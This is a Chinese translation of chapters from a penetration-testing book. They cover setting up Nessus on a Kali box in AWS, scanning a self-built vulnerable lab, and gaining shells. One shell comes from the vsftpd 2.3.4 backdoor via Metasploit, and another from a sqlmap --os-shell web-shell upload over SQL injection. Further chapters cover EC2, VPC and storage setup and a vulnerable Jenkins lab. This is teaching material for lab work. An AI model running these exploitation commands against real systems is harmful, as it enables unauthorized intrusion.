在第二章中，*在云上设置 Kali PentestBox*，我们设置了一个渗透测试实验室，以及配置了远程访问的 Kali Linux PentestBox。现在是时候开始在实验室中的易受攻击主机上执行一些扫描和利用了。

本章将重点介绍使用商业工具的免费版本进行自动化漏洞扫描的过程，然后利用**Metasploit**来利用发现的漏洞。这些漏洞早已内置在实验室环境中，在之前配置的易受攻击主机上，分别在第一章和第二章中。

本章将涵盖以下主题：

+   使用 Nessus 运行自动化扫描并验证发现的漏洞

+   使用 Metasploit 和 Meterpreter 进行利用

+   利用易受攻击的 Linux 和 Windows 虚拟机（VMs）

# 技术要求

本章将使用以下工具：

+   Nessus（需要手动安装）

+   Metasploit

# 配置和运行 Nessus

Nessus 是一个流行的工具，用于自动化网络内的漏洞扫描，还具有扫描 Web 应用程序的附加功能。在第一部分中，我们将在 EC2 上的 PentestBox 上设置 Nessus。然后我们将使用它在之前设置的实验室上运行基本和高级扫描。

# 在 Kali 上安装 Nessus

使用 Nessus 进行自动化渗透测试和漏洞评估的第一步，显然是在 Kali 上安装它。为了简化操作，Nessus 以`.deb`软件包的形式直接安装，可以使用`dpkg`进行安装。

1.  要安装 Nessus，第一步是从 tenable 网站下载`.deb`软件包，网址为[`www.tenable.com/downloads/nessus`](https://www.tenable.com/downloads/nessus)：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f5a8e164-a97f-409d-8d89-7bc89a5b5624.png)

1.  下载后，我们需要将其传输到我们在 AWS 上的 Kali PentestBox。在 Windows 上，可以使用**WinSCP**进行文件传输。在 Linux/macOS 上，可以使用本机 SCP 实用程序。设置在[`winscp.net/eng/download.php`](https://winscp.net/eng/download.php)上可用

1.  安装了 WinSCP 后，我们需要建立到 Kali PentestBox 的连接。首先，我们需要添加一个新站点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4060d84f-4f58-468f-8b6a-ffd1a6d4cb8e.png)

1.  接下来，我们需要添加从 AWS 下载的公钥进行身份验证。为此，需要点击高级并在 SSH | 身份验证中设置密钥的路径：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/922ed0c0-3710-410a-b026-04f9b3313fa0.png)

1.  完成后，只需保存站点，然后连接到它，以在远程主机上查看文件夹列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d57e4499-a3e6-4cb6-88bf-d81022775642.png)

1.  从这里开始，只需将`.deb`软件包拖放到我们在上一步中访问的`root`文件夹中。完成后，我们可以开始安装软件包。可以通过 SSH shell 到 AWS EC2 实例使用`dpkg`来实现：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/c66eef64-0a8b-4451-a9d3-f3e4abad9e27.png)

1.  完成后，启动 Nessus 服务并确认其正在运行：

```
sudo /etc/init.d/nessusd start
sudo service nessusd status
```

1.  如果`status`命令返回运行状态，则我们已成功启动服务。接下来，我们需要设置 SSH 隧道，将端口`8834`从 Kali PentestBox 转发到我们的本地主机上的 SSH 连接。在 Linux 终端上，需要使用以下语法：

```
ssh -L 8834:127.0.0.1:8834 ec2-user@<IP address>
```

1.  在 Windows 上，如果使用 PuTTY，可以在此处配置 SSH 隧道，点击 PuTTY 启动后选择 Tunnels 选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/449c39b4-00f8-4821-a466-7009213a9553.png)

1.  完成后，重新连接到实例，现在可以在本地机器上访问 Nessus，网址为`https://127.0.0.1:8834`。

# 配置 Nessus

一旦 Nessus 被安装并且 SSH 隧道被配置，我们可以通过指向`https://127.0.0.1:8834`在浏览器上访问 Nessus。我们现在需要经历一系列的第一步来设置 Nessus。

1.  第一个屏幕提示用户创建一个帐户：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/684b5a17-b727-43f6-9e8c-1b8fe9c9ef7d.png)

1.  输入合适的凭据并继续下一步。现在我们需要激活家庭许可证。我们可以在[`www.tenable.com/products/nessus-home`](https://www.tenable.com/products/nessus-home)填写以下表格来获取一个：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/333e486c-8566-40e3-95d1-b4c648e40640.png)

1.  一旦您通过电子邮件收到激活码，请在 Web 界面中输入它并触发初始化过程。现在 Nessus 正在下载扫描网络资产所需的数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/59b08e73-99da-49a3-8b55-a3872e24798e.png)

这个过程通常需要几分钟，所以在这个过程中有足够的时间去拿一杯咖啡。

# 执行第一次 Nessus 扫描

初始化完成后，我们将被 Nessus 主页欢迎。在这里，我们需要点击“新扫描”来开始对我们之前设置的渗透测试实验室进行新的扫描。

1.  一旦进入新的扫描选项卡，我们需要开始一个基本的网络扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d2d914a2-f776-492b-9b29-deb05169fd2c.png)

1.  点击基本网络扫描后，我们需要给出一个扫描名称，并输入实验室中设置的另外两个主机的 IP：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/302633ca-2b37-4469-8fef-301503eb1bfd.png)

1.  接下来，我们配置 DISCOVERY 和 ASSESSMENT 选项。对于发现，让我们请求扫描所有服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/52ebfaef-707e-4c14-b49e-9a28a95ffe93.png)

这样做的好处是枚举主机上运行的所有服务，并在它们上没有传统服务运行时发现主机。

1.  让我们配置 Nessus 来扫描 Web 应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/42cfc52f-3427-4682-be08-920b213d987c.png)

1.  最后，我们启动扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ec3245c9-d518-4e2d-8985-2cb0f8d8c019.png)

一次又一次，扫描是一个耗时的过程，所以平均需要大约 15 到 20 分钟才能完成，如果不是更多的话。

# 利用一个有漏洞的 Linux 虚拟机

现在我们已经完成了对易受攻击实验室中两个主机的扫描，是时候开始对这些主机进行利用了。我们的第一个目标是我们实验室中设置的 Ubuntu 实例。在这里，我们将查看这个主机的扫描结果，并尝试未经授权地访问这个主机。

# 了解 Linux 的 Nessus 扫描

我们首先从我们的 Ubuntu 服务器主机的 Nessus 扫描结果开始：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/26a5f1a9-ebcb-483a-88d0-77dfccf230de.png)

毫不奇怪，我们只发现了一堆信息漏洞，因为只安装了两个服务——**FTP**和**SSH**。FTP 服务器内置了一个后门；然而，它并没有成为一个关键的漏洞。如果你看一下 Linux 扫描中的最后一个结果，它确实检测到安装了带有后门的 vsftpd 2.3.4。

总结一下这个页面上的其他结果，Nessus SYN 扫描器只是列出了主机上启用的一些服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a0193409-10bc-4dff-8042-bdec6bde3b09.png)

这个页面上还有一堆更有用的信息可以手动检查。目前，我们将专注于我们在 Ubuntu 服务器上安装的`vsftpd`服务的利用。

# 在 Linux 上的利用

为了利用`vsftpd`服务，我们将使用 Kali Linux 内置的`Metasploit`。只需在终端中输入`msfconsole`即可加载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/64f6cca1-ea4d-492c-963e-5e4f73787e54.png)

在这里，我们可以简单地搜索服务的名称，看看是否有任何相关的利用。要做到这一点，只需运行以下命令：

```
search vsftpd
```

这将列出具有特定关键字的利用列表。在这种情况下，只有一个利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e44c426b-3109-4681-bfd7-815f81bdd7a8.png)

我们可以通过运行以下命令来使用这个利用：

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

这将更改提示符为利用的提示符。现在需要做的就是运行以下命令：

```
set RHOST <ip address of Ubuntu server>
```

以下是确认的显示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/bec749ad-29cb-4123-a329-3c6508c93b5d.png)

最后，只需运行`exploit`，`vsftpd exploit`将被执行，以提供具有`root`权限的交互式反向 shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a98aa71a-2885-43d3-b8a2-cb73442b6e4c.png)

使用这个反向 shell，您可以自由运行操作系统支持的任何命令。这是一个很好的地方，可以在`Metasploit`上玩弄辅助和后期利用模块。

# 利用易受攻击的 Windows 虚拟机

最后，让我们来看一下 Windows Nessus 扫描的结果。这有更有趣的扫描结果，因为我们使用了一个不再接收更新的 EOL 操作系统，以及一个较旧版本的 Web 应用程序服务器。

# 理解 Windows Nessus 扫描

由于使用了终止生命周期的操作系统以及过时的服务器，Windows 的 Nessus 扫描产生了大量问题。让我们首先专注于最关键的发现：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/87078513-0a66-4add-a541-13a2b4ce937a.png)

存在许多与过时的 OpenSSL 和 PHP 安装有关的问题，以及一些发现指出 Windows Server 2003 是不受支持的操作系统。然而，这里最重要的问题是检测到 SMBv1 中的多个漏洞。此漏洞的详细信息指出了相关 SMB 漏洞的**通用漏洞和暴露**（**CVEs**）以及这些漏洞的补丁：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/06befeba-c9da-4ca4-97d2-4828a8a4766b.png)

除了易受攻击和过时的服务外，扫描还发现了一些 Web 应用程序问题：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a33ec4b0-86b5-4cdc-8cf8-bafd35258a63.png)

由于我们在 Linux 主机上利用了一个网络服务，我们将专注于利用 Web 应用程序的一个漏洞来获得对 shell 的访问。

# 在 Windows 上的利用

易受攻击的 Web 应用程序存在**SQL 注入**漏洞。SQL 注入允许攻击者注入任意的 SQL 查询并在后端 DBMS 上执行它们。此漏洞存在于以下 URL 上：

```
http://<ip>/books1.php?title=&author=t
```

在可能以管理员权限运行的 Web 应用程序上发生的 SQL 注入意味着可能完全接管 Web 应用程序。为此，我们将使用`sqlmap`。要使用`sqlmap`攻击 URL，语法如下：

```
sqlmap --url="http://<IP>/books1.php?title=&author=t"
```

`sqlmap`确认存在注入漏洞，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4218cacc-b63b-432e-8e6b-f5dc63e5339d.png)

下一步是使用`sqlmap`在远程服务器上获得 shell 访问权限。`sqlmap`带有一个非常方便的功能，可以上传一个分段器，用于将进一步的文件上传到 webroot。然后它通过上传一个执行命令并返回命令输出的 Web shell 来跟进，所有这些都可以通过一个命令完成。为了触发这个，执行以下命令：

```
sqlmap --url="http://<IP>/books1.php?title=&author=t" --os-shell --tmp-path=C:\\xampp\\htdocs
```

`--os-shell`要求`sqlmap`使用先前描述的方法生成一个 shell，`--tmp-path`值指定上传 PHP 文件的位置，以生成 shell。一旦执行命令，用户输入将被提示两次。第一次是选择技术，这种情况下是 PHP。第二次是触发完整路径泄露，可以启用。如果一切顺利，我们应该会看到一个交互式 shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f0282943-7701-4a14-9fc8-11ea03180fef.png)

与 Linux 利用一样，通过这个交互式 shell 可以执行任何命令。

# 总结

本章介绍了在 Kali PentestBox 上在 EC2 上设置 Nessus 的过程。在此之后，解释了 SSH 隧道，以访问 Nessus 服务而不将其暴露在互联网上。一旦可以访问 Nessus 实例，我们就能激活它并对 pentest 实验室中设置的两台主机执行自动扫描。这些自动扫描产生了许多结果，进一步帮助我们利用它们。最后，本章涵盖了通过利用易受攻击的网络服务来利用和接管 Linux 主机，以及通过利用 Web 应用程序漏洞来利用和接管 Windows 主机。

这结束了本章，重点是面向首次进行渗透测试的人员，他们希望进行 AWS 渗透测试，但手头没有实验环境。在下一章中，我们将深入探讨设置 EC2 实例并执行自动和手动利用的内容。

# 问题

1.  在 Nessus 中，高级扫描相对于基本扫描有什么优势？

1.  Metasploit 的`aux`和`post`模块是什么？

1.  有没有办法通过利用`vsftpd`获得 Bash shell？

1.  有没有办法通过利用`vsftpd`在 Linux 主机上获得 VNC 访问？

1.  为什么 Windows 主机会自动给予管理员权限？

# 进一步阅读

+   精通 Metasploit: [`www.packtpub.com/networking-and-servers/mastering-metasploit`](https://www.packtpub.com/networking-and-servers/mastering-metasploit)

+   Nessus 8.2.x: [`docs.tenable.com/nessus/`](https://docs.tenable.com/nessus/)

+   Metasploit Unleashed—免费的道德黑客课程: [`www.offensive-security.com/metasploit-unleashed/`](https://www.offensive-security.com/metasploit-unleashed/)


# 第二部分：Pentesting AWS 弹性计算云配置和安全

在本节中，读者将了解配置 EC2 实例的所有方面，以及对它们进行渗透测试和保护的过程。

本节将涵盖以下章节：

+   第四章，设置您的第一个 EC2 实例

+   第五章，使用 Kali Linux 对 EC2 实例进行渗透测试

+   第六章，弹性块存储和快照-检索已删除的数据


# 第四章：设置您的第一个 EC2 实例

AWS 最受欢迎和核心的组件是**弹性计算云**（**EC2**）。EC2 通过虚拟机为开发人员提供按需可扩展的计算基础设施。这意味着开发人员可以在选择的地理位置中启动具有自定义规格的虚拟机来运行他们的应用程序。

该服务是**弹性**的，这意味着开发人员可以根据操作的需要选择扩展或缩减他们的基础设施，并仅按分钟支付活动服务器。开发人员可以设置地理位置以减少延迟并实现高度冗余。

本章重点介绍创建 Amazon EC2 实例，围绕实例设置 VPC，并配置防火墙以限制对该 VPC 的远程访问。

在本章中，我们将涵盖以下主题：

+   如何使用可用的 AMI 设置定制的 EC2 实例

+   用于 EC2 实例的存储类型

+   防火墙和 VPC 配置

+   认证机制

# 技术要求

在本章中，我们将使用以下工具：

+   AWS EC2 实例

+   Ubuntu Linux AMI

+   SSH 客户端和浏览器

# 在 AWS EC2 上设置 Ubuntu

在本节中，我们将介绍如何在云上运行 Ubuntu AMI 的 EC2 实例，并查看我们可以根据需求自定义的各种设置。

# Ubuntu AMI

正如我们在之前的章节中所看到的，设置 EC2 实例可以非常简单且可以通过几次鼠标点击快速完成。AWS 市场提供了许多准备好部署的 AMI。AWS 市场还提供了一系列来自供应商如 SAP、Zend 和 Microsoft 以及开源的 AMI，专为使命关键的项目（如 DevOps 和 NAS）定制的 AMI：

1.  我们将从 AWS 市场中搜索 Ubuntu Linux AMI：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/2b641e4f-b331-4b2c-b01f-21f93fea7bc8.png)

我们将使用撰写时可用的最新 Ubuntu AMI，Ubuntu 18.04 LTS - Bionic。

上述截图显示了以下信息：

+   +   我们正在使用的 AMI 的版本（18.04 LTS）

+   Ubuntu 可用的实例类型，以及每个实例的每小时定价

+   AMI 的概述和详细信息

1.  在下一页中，我们为我们的 AMI 选择实例类型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/02997ebc-afda-4003-84cf-5ce67972e012.png)

选择实例类型

1.  AWS 为 Ubuntu 提供了一个免费的 t2.micro 实例，该实例运行在 1 个 vCPU 和 1GB 内存上，这对于本教程来说是足够的。确保选择了 t2.micro 并点击下一步。

我们已经配置了 EC2 实例的 RAM 和 CPU。在接下来的部分，我们将学习如何配置其网络和 VPC 设置。

# 配置 VPC 设置

在上一节中，我们配置了 EC2 实例的 RAM 和 CPU。在本节中，我们将学习如何为我们的 EC2 实例创建新的 VPC 和子网。

一旦我们选择了 t2.micro 作为我们的实例类型，我们就会看到配置实例详细信息页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4e846158-fbee-4202-aaee-b694ef9a35d7.png)

在本节中，我们将看到如何配置以下选项：

+   **实例数量**：这取决于读者决定启动多少个实例。在本章中，我们只启动一个实例。

+   **网络**：我们将看一下如何为我们的 EC2 资源创建新的 VPC。

+   **子网**：我们将把我们的 EC2 资源分隔到 VPC 中的不同子网中。

+   **自动分配公共 IP**：我们将启用此功能，以便我们可以从我们的机器访问它。

让我们从创建 VPC 开始：

1.  通过点击创建新 VPC 链接，我们被带到 VPC 仪表板，我们可以看到现有的 VPC 并创建新的 VPC：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3f1f801e-982a-474d-88d3-920a554925cd.png)

1.  点击创建 VPC 并命名为`New VPC`。

我们已经有一个 IPv4 块为`172.31.0.0/16`的 VPC 网络。让我们继续创建一个 IPv4 块为`10.0.0.0/16`的新 VPC。正如对话框中所提到的，我们的 IPv4 CIDR 块大小只能在`/16`和`/28`之间。

1.  点击是，创建，您的 VPC 将在几秒钟内创建：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/107d74c9-96e4-4156-8627-f701fc026ff4.png)

要在此 VPC 中启动我们的 EC2 实例，我们将不得不创建一个子网。让我们转到子网部分，并在我们的新 VPC 中创建一个子网。

1.  单击创建子网并给它一个名称，`新子网`。我们将选择我们创建的 VPC。选择`新 VPC`后，VPC CIDR 块将显示在显示中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b6db1cb6-1147-4cf2-bb02-211dbbff2631.png)

用户可以从提供的可用区中选择任何可用区。但是，我们将其保持为无偏好。

我们正在使用 IPv4 CIDR 块`10.0.1.0/24`创建子网，这意味着它将为我们提供 IP 范围从`10.0.1.1`到`10.0.1.254`。但是，我们只有 251 个可用的 IP 地址。这是因为`10.0.1.1`保留给子网的网关，`10.0.1.2`保留给 AWS DNS，`10.0.1.3`保留给 AWS 的任何未来使用。

1.  完成后，我们选择我们的 VPC 作为新的 VPC，并选择子网|新子网。您的屏幕应该是这样的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/54799c48-c353-4253-8405-571b3c98609a.png)

6. 让我们继续添加存储：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b429e61a-536e-4668-81c6-af373e18c9b5.png)

正如我们所看到的，每个 EC2 实例在启动时默认接收一个根存储设备。每个 EC2 实例默认获得一个默认的根存储。这是为了存放实例启动的操作系统文件。除此之外，如果需要，我们可以向 EC2 实例添加额外的存储。

# 在 EC2 实例中使用的存储类型

亚马逊为 EC2 实例提供以下存储类型：

+   **弹性块存储（EBS）**：AWS 提供的高速存储卷。这些是典型的存储卷，可用于 HDD 或 SSD 技术。这些是原始和未格式化的，可以附加到任何 EC2 实例，就像在现实生活中安装硬盘驱动器一样。这些卷需要在使用之前进行格式化。设置好后，可以将其附加、挂载或卸载到任何 EC2 实例。这些卷速度快，最适合高速和频繁的数据写入和读取。这些卷可以在 EC2 实例被销毁后设置为持久。或者，您可以创建 EBS 卷的快照并从快照中恢复数据。

+   **亚马逊 EC 实例存储**：实例存储存储卷物理附加到托管 EC2 实例的主机计算机上，用于临时存储数据。换句话说，一旦附加到的 EC2 实例被终止，实例存储卷也会丢失。

+   **亚马逊 EFS 文件系统**：**弹性文件系统**（EFS）只能与基于 Linux 的 EC2 实例一起使用，用于可伸缩的文件存储。可伸缩存储意味着文件系统可以根据用例进行大规模扩展或收缩。在多个实例上运行的应用程序可以使用 EFS 作为它们的共同数据源，这意味着 EFS 可以同时被多个 EC2 实例使用。

+   **亚马逊 S3**：Amazon S3 是 AWS 的旗舰服务之一，用于在云上存储数据。它具有高度可伸缩性，并使我们能够随时存储和检索任意数量的数据。Amazon EC2 使用 Amazon S3 存储 EBS 快照和实例存储支持的 AMI。

我们默认有一个 8GB 的根卷卷。在此活动中，让我们向 EC2 实例添加一个额外的 EBS 卷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/18034803-77fd-4841-a650-6d8366f3e799.png)

在 EBS 中，我们可以看到有五种不同的卷类型，可以使用不同的**每秒输入/输出操作**（**IOPS**）：

+   **通用用途 SSD（GP2）卷**：这是一个成本效益的存储解决方案，主要适用于各种工作负载。该卷可以在较长时间内维持 3,000 IOPS，最小为 100 IOPS，最大为 10,000 IOPS。GP2 卷提供非常低的延迟，并且可以以每 GB 3 IOPS 的速度扩展。GP2 卷可以分配 1GB 到 16TB 的空间。

+   **预留 IOPS SSD（IO1）卷**：这些比 GP2 卷快得多，性能也比较高。IO1 卷可以维持 100 到 32,000 IOPS 之间的性能，这比 GP2 高出三倍多。这种存储类型专为数据库等 I/O 密集型操作而设计。AWS 还允许您在创建 IO1 卷时指定 IOPS 速率，AWS 可以持续提供。IO1 卷的预留容量在最小 4GB 和最大 16TB 之间。

+   **吞吐量优化 HDD（ST1）**：ST1 是基于磁存储盘而不是 SSD 的低成本存储解决方案。这些不能用作可引导卷，而是最适合存储频繁访问的数据，如日志处理和数据仓库。这些卷只能在最小 1GB 和最大 1TB 之间。

+   **冷 HDD（SC1）**：SC1 或冷 HDD 卷，虽然与 ST1 卷相似，但不适用于保存频繁访问的数据。这些也是低成本的磁存储卷，不能用作可引导卷。与 ST1 类似，这些卷只能在最小 1GB 和最大 1TB 之间。

对于本教程，我们正在向我们的机器添加一个额外的 40GB EBS 卷通用用途 SSD（GP2）。不要忘记勾选“终止时删除”，否则存储实例将在终止 EC2 实例后继续存在。

我们不会给我们的 EC2 实例添加任何标签，所以让我们继续下一节，“安全组”。

# 配置防火墙设置

每个 EC2 实例都受到其自己的虚拟防火墙的保护，称为安全组。这就像一个典型的防火墙，通过控制入站和出站流量来管理对 EC2 实例的访问。在设置 EC2 实例时，我们可以添加规则来允许或拒绝流量到相关的 EC2 实例。EC2 实例也可以分组到一个安全组中，这在需要将一个防火墙规则应用于多个 EC2 实例时非常有用。一旦规则被修改，更改立即生效。

运行 Linux AMI 映像的 EC2 实例默认允许远程访问的 SSH 端口。在 Windows 机器的情况下，默认允许 RDP：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4ac1de6f-f007-409f-bd20-d0bd0bcc3206.png)

正如我们所看到的，由于我们的 AMI 是 Ubuntu Linux 映像，AWS 已自动配置了网络规则，只允许 SSH（端口 22）。让我们添加一些网络规则来允许 HTTP 和 HTTPS：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/300a5b19-7af9-4ef9-8bd1-b13a8330ff45.png)

现在，我们已经准备好启动我们的 AMI。点击“审阅和启动”，然后点击“启动”。

在下一节中，我们将看看配置认证以访问我们的 EC2 实例。

# 配置 EC2 认证

在 AWS 中，所有 AMI Linux 映像都配置为使用密钥对认证 SSH 会话，而不是密码。

在启动 EC2 实例之前，AWS 提示我们配置 SSH 密钥对以便连接。我们可以创建自己的 SSH 密钥对，也可以使用现有的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e4e6af18-7822-49db-b21b-6cb415290c17.png)

1.  让我们创建一个新的密钥对，并命名为`ubuntukey`。

1.  然后，下载密钥对并启动实例。我们得到的密钥对文件是`ubuntukey.pem`。文件的名称将根据先前提供的密钥名称而更改。确保密钥文件存储安全。如果密钥丢失，AWS 将不会提供另一个密钥文件，您将无法再访问您的 EC2 实例。

1.  下载密钥文件后，AWS 会将您重定向到启动状态页面，让您知道您的 EC2 实例正在启动：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/85088d9d-52a7-484b-a541-4366c8a8c12d.png)

现在，我们可以转到我们的 EC2 实例列表，并查找分配的公共 IP 地址。

现在，要连接到 AWS 机器，您可以从本地 Linux 机器上这样做：

+   打开终端并输入以下命令：

```
ssh -i <<keyname>>.pem ec2-user@<<your public ip>>
```

但是，从 Windows 本地计算机连接需要更多的工作：

1.  在本地计算机上安装 PuTTY。现在我们必须将`.pem`文件转换为`.ppk`文件，因为 PuTTY 只接受`.ppk`（PuTTY 私钥）。

1.  从开始菜单启动 PuTTYgen 并单击加载。选择“所有文件”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/eb960a98-9067-4410-85bc-6b50b6a9bb5d.png)

1.  现在，将 PuTTYgen 指向我们下载的`.pem`文件。PuTTYgen 将加载并转换您的文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f2383d83-5596-4c79-aed2-5ad63a8f7400.png)

1.  加载`.pem`文件后，单击“保存私钥”以生成`.ppk`文件。PuTTY 会显示警告，并询问您是否要保存不带密码的密钥。您可以选择“是”。

1.  为您的`.ppk`文件提供一个名称，然后单击保存。

1.  一旦我们将`.pem`文件转换为`.ppk`文件，我们就可以使用 PuTTY 连接到我们的 EC2 实例。首先从开始菜单启动 PuTTY。

1.  在“主机名”字段中，输入主机名`ubuntu@<<您的公共 IP>>`。将端口保留在 22 号：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/afe90e1b-9f83-4eeb-8b28-20cf457f592e.png)

1.  接下来，单击 SSH 旁边的+按钮。转到 Auth，然后在名为“用于身份验证的私钥文件”的字段旁边，单击浏览。将 PuTTY 指向我们创建的`.ppk`文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ed4a6890-166f-432f-ba79-15e888eb088d.png)

1.  最后，点击“打开”开始您的 SSH 会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/16714ae9-6314-4408-8abf-6cdd387c20b3.png)

由于这是您首次登录到实例，您将收到以下警报。

1.  点击“是”继续。您将被验证到 Ubuntu 实例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/03b98a4e-c61c-40f0-ac5e-880228cb4081.png)

这就结束了本章的练习。我们成功创建了一个 EC2 机器，并学会了如何创建新的 VPC 和子网。我们还看到了 AWS 提供的不同类型的存储卷，并学会了如何为特定实例配置防火墙规则。最后，我们设置了身份验证并登录到我们的 Ubuntu 机器。

# 摘要

本章介绍了如何设置 EC2 实例并配置 EC2 实例设置的种种细节，例如创建新的 VPC，在 VPC 中配置新的子网以及添加额外的存储。本章解释了可用于 EC2 实例的不同类型的存储，例如 EBS 和实例存储。此外，我们了解了存储卷的类型以及它们适用于什么。随后，我们学习了如何使用 EC2 实例的安全组配置防火墙规则。这就是本章的结束。

在下一章中，我们将学习如何对运行多个 EC2 实例的 AWS 环境进行真实的渗透测试。此外，我们将学习如何使用 Metasploit 执行自动化利用，并在网络中使用主机枢纽进行横向移动。

# 进一步阅读

+   **存储**：[`docs.aws.amazon.com/AWSEC2/latest/UserGuide/Storage.html`](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/Storage.html)

+   **什么是 Amazon VPC？**：[`docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html`](https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html)

+   **Amazon VPC 网络管理员指南**：[`docs.aws.amazon.com/vpc/latest/adminguide/Welcome.html`](https://docs.aws.amazon.com/vpc/latest/adminguide/Welcome.html)


# 第五章：使用 Kali Linux 对 EC2 实例进行渗透测试

在第三章中，*在 Kali Linux 上利用云进行渗透测试*，我们学习了如何对在 AWS 上运行的脆弱机器进行渗透测试。本章旨在帮助读者为高级渗透测试和更多实际场景设置一个脆弱的实验室。这个实验室将让我们了解 DevOps 工程师在**持续集成和持续交付** (**CI/CD**)流水线中常见的安全配置错误。

本章重点介绍在 Linux **虚拟机** (**VM**)上设置一个脆弱的 Jenkins 安装，然后使用我们在第三章中学到的技术进行渗透测试。此外，我们还将介绍一些用于扫描和信息收集的技术，以帮助我们进行渗透测试。最后，一旦我们妥协了目标，我们将学习技术来进行枢纽和访问云中的内部网络。

在本章中，我们将涵盖以下内容：

+   在我们的虚拟实验室中设置一个脆弱的 Jenkins 服务器

+   配置和保护虚拟实验室，以防止意外访问

+   对脆弱机器进行渗透测试，并学习更多的扫描技术

+   妥协我们的目标，然后执行后渗透活动

# 技术要求

本章将使用以下工具：

+   Nexpose（需要手动安装）

+   Nmap

+   Metasploit

+   Jenkins

# 在 Windows 上安装一个脆弱的服务

Jenkins 是 DevOps 环境中 CI/CD 流水线的一个非常重要的组件，主要作为自动化服务器。Jenkins 的主要任务是在软件开发过程中提供持续集成并促进持续交付。Jenkins 可以与 GitHub 等版本管理系统集成。在典型情况下，Jenkins 会获取上传到 GitHub 的代码，构建它，然后部署到生产环境中。要了解更多关于 Jenkins 的信息，请参阅[`www.cloudbees.com/jenkins/about.`](https://www.cloudbees.com/jenkins/about)

Jenkins 提供了在其构建控制台中提供自定义构建命令和参数的选项。这些命令直接发送到**操作系统**（**OS**）的 shell。在这种情况下，我们可以将恶意代码注入构建命令中，以妥协运行 Jenkins 的服务器，从而访问目标网络。

我们将首先启动一个 Windows Server 2008 实例（您可以选择任何层级；但是，免费层级应该足够）。对于本教程，默认存储空间就足够了。让 EC2 实例启动。

我们将配置实例使其脆弱。因此，在传入/传出规则部分，确保只有端口`3389`对外部网络开放。此外，为了确保我们的 Kali 机器能够访问 Jenkins 服务器，允许来自 Kali 机器 IP 的传入连接，而不允许其他地方。

